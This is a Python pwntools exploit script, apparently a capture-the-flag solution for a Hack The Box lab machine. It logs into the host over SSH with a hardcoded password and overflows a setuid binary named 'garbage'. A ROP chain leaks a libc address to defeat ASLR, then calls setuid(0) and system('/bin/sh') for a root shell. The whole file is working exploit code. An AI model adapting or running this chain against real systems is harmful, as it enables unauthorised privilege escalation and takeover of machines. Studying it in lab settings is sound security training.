#!/usr/bin/env python

from pwn import *
import os

# p64(address) # converting to little endian

# Easy way to find buffer overflow - 'cyclic 1000 | ./file ; dmesg | tail -5'
# Then look for the last address and use 'cyclic -l address'
# For this application, I need to do it differently. Use gdb with cyclic amount,
# then check RSP and extract the last 4 byte & use cyclic -l on it

# NX enabled - little endian 64

# ----------------------------------

# p = process('./garbage')
context(os='linux', arch='amd64')
# context.log_level = 'debug'
s = ssh('margo', 'ellingson.htb', password='iamgod$08')

# Automating everything (Well trying to atleast..)
p = s.process('/bin/sh', env={'PS1':''})
log.info("Mapping binaries")
p.sendline('/usr/bin/garbage')
garbage = ELF('./garbage')
rop = ROP(garbage)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # May need to change to so.2

# Stage 1 - Leak ------------------
junk = "A"*136
rop.search(regs=['rdi'], order = 'regs') # Finds gadget
rop.puts(garbage.got['puts']) # Finds puts
rop.call(garbage.symbols['main']) # reruns main
log.info('Stage 1 ROP Chain:\n' + rop.dump())


# Sending payload
payload = junk + str(rop)
p.sendline(payload)
garbage = p.recvuntil("access denied.") # Stops right before leak

# Cutting puts out of the output
leaked_puts = p.recv(7).strip().ljust(8, '\x00')
leaked_puts = u64(leaked_puts)
log.info("puts address is: {}".format(hex(leaked_puts)))

# Stage 2 - ignore
libc.address = leaked_puts - libc.symbols['puts'] # Finding offset
log.info("offset is: {}".format(hex(libc.address)))


# Trying to automate ------------------

# # Finding setuid
# suid_addr = ROP(libc)
# suid_addr.system(next(libc.search('setuid')))
# log.info("setuid address is: {}".format(suid_addr))

# # Finding binsh
# bin_sh = ROP(libc)
# bin_sh.search(regs=['rdi'], order = 'regs') # Finds gadget
# bin_sh.system(next(libc.search('/bin/sh\x00')))
# log.info("bin_sh address is: {}".format(bin_sh))

# # Finding sys
# libc_sys = ROP(libc)
# libc_sys.system(next(libc.search('system')))
# log.info("libc_system address is: {}".format(libc_sys))

# Trying to automate ------------------


# Hard coded address - Use 'readelf -s libc_file | grep name', to find addresses
libc_put = 0x809c0
libc_sys = 0x4f440
libc_sh = 0x1b3e9a
libc_suid = 0xe5970

pop_rdi = p64(0x40179b) # ROP gadget
zero_addr = p64(0) # for setting id to root
offset = leaked_puts - libc_put # finding offset, so we can clal the correct addresses (due to aslr)
sys_addr = p64(offset + libc_sys) # system address
sh_addr = p64(offset + libc_sh) # shell
suid_addr = p64(offset + libc_suid) # adding root perms

payload = junk + pop_rdi + zero_addr + suid_addr  + pop_rdi + sh_addr + sys_addr

p.sendline(payload)
p.recv()
p.interactive()

